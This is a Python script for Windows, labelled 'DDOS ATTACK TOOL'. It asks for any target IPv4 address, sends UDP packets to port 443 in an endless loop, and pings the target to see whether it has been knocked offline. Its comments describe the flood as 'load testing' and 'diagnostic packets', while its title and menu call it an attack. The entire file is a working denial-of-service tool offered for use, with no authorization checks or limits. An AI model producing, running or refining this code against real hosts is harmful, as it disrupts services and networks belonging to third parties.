import socket
import threading
import time
import sys
import ctypes
import msvcrt

ctypes.windll.kernel32.SetConsoleTitleW("DDOS V1")

iphlpapi = ctypes.windll.iphlpapi
icmp = ctypes.windll.icmp
ws2_32 = ctypes.windll.ws2_32

INVALID_HANDLE_VALUE = -1

class IP_OPTION_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("Ttl", ctypes.c_ubyte),
        ("Tos", ctypes.c_ubyte),
        ("Flags", ctypes.c_ubyte),
        ("OptionsSize", ctypes.c_ubyte),
        ("OptionsData", ctypes.c_void_p),
    ]

class ICMP_ECHO_REPLY(ctypes.Structure):
    _fields_ = [
        ("Address", ctypes.c_uint32),
        ("Status", ctypes.c_uint32),
        ("RoundTripTime", ctypes.c_uint32),
        ("DataSize", ctypes.c_uint16),
        ("Reserved", ctypes.c_uint16),
        ("Data", ctypes.c_void_p),
        ("Options", IP_OPTION_INFORMATION),
    ]

def check_packet_loss(icmp_handle, ip_str):
    """Reusable ICMP check logic using WinAPI"""
    if icmp_handle == INVALID_HANDLE_VALUE:
        return False

    try:
        ip_bytes = socket.inet_aton(ip_str)
        ip_addr = ctypes.c_uint32.from_buffer_copy(ip_bytes).value
    except socket.error:
        return False

    send_data = b"PingData"
    reply_size = ctypes.sizeof(ICMP_ECHO_REPLY) + len(send_data) + 8
    reply_buffer = ctypes.create_string_buffer(reply_size)

    ret_val = icmp.IcmpSendEcho(
        icmp_handle,
        ip_addr,
        send_data,
        len(send_data),
        None,
        reply_buffer,
        reply_size,
        800
    )

    if ret_val != 0:
        echo_reply = ICMP_ECHO_REPLY.from_buffer(reply_buffer)
        return echo_reply.Status == 0
    
    return False

def monitor_health(ip, stop_event):
    """Background thread to check if host is still responsive"""
    icmp_handle = icmp.IcmpCreateFile()
    if icmp_handle == INVALID_HANDLE_VALUE:
        return
    
    try:
        while not stop_event.is_set():
            if not check_packet_loss(icmp_handle, ip):
                sys.stdout.write(f"\n[!] Alert: No response from {ip} (Network congestion or target offline)\n")
                sys.stdout.flush()
            
            
            for _ in range(20):
                if stop_event.is_set():
                    break
                time.sleep(0.1)
    finally:
        icmp.IcmpCloseHandle(icmp_handle)

def load_test(ip, stop_event):
    """Network load testing thread logic"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    except socket.error as e:
        sys.stderr.write(f"Failed to create socket: {e}\n")
        stop_event.set()
        return

    port = 443
    addr = (ip, port)
    buffer = b'A' * 1024
    packet_count = 0

    try:
        while not stop_event.is_set():
            
            for _ in range(50):
                if stop_event.is_set():
                    break
                try:
                    sock.sendto(buffer, addr)
                    packet_count += 1
                    
                    if packet_count % 100 == 0:
                        sys.stdout.write(f"\r[+] Diagnostic packets sent: {packet_count} to {ip}")
                        sys.stdout.flush()
                except socket.error as e:
                    err_code = e.errno if hasattr(e, 'errno') else 0
                    if err_code != 10035: 
                        sys.stderr.write(f"\nSocket error: {e}\n")
                        stop_event.set()
                        break
    finally:
        sock.close()

def main():
    while True:
        print("\n" + "="*40)
        print("   DDOS ATTACK TOOL")
        print("="*40)

        target_ip = ""
        while True:
            try:
                target_ip = input("Enter Target IPv4 (or 'exit' to quit): ").strip().lower()
                if target_ip == 'exit':
                    print("Exiting tool...")
                    return
                if not target_ip:
                    continue
                
                socket.inet_aton(target_ip)
                break
            except socket.error:
                print("Invalid format. Please enter a valid IPv4 address.")
            except EOFError:
                return

        print(f"\nTarget: {target_ip}")
        print("Press any key to start diagnostic test...")
        msvcrt.getch()

        
        stop_event = threading.Event()
        
        load_thread = threading.Thread(target=load_test, args=(target_ip, stop_event))
        health_thread = threading.Thread(target=monitor_health, args=(target_ip, stop_event))
        
        load_thread.start()
        health_thread.start()

        print("Test running. Press 'S' to stop and return to menu.")

        try:
            while not stop_event.is_set():
                if msvcrt.kbhit():
                    ch = msvcrt.getch()
                    if ch.lower() == b's':
                        stop_event.set()
                        break
                time.sleep(0.1)
        except KeyboardInterrupt:
            stop_event.set()

        print("\nStopping diagnostic threads...")
        load_thread.join()
        health_thread.join()
        print("Test cycle complete.")

if __name__ == "__main__":
    main()

